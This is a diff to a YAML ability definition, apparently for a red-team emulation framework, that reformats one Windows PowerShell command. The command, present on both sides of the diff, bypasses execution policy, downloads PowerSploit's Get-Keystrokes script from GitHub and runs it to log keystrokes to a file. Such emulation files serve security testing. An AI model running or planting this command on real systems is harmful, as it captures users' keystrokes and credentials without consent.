@@ -10,10 +10,8 @@ technique:
 platforms:
   windows:
     pwsh:
-      command: >-
-        powershell.exe -exec bypass -C "IEX (New-Object
-        Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1');
-        Get-Keystrokes -LogPath C:\key.log -Timeout 60"
+      command: |
+        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath C:\key.log -Timeout 60"
 metadata:
   authors:
     - bfuzzy1
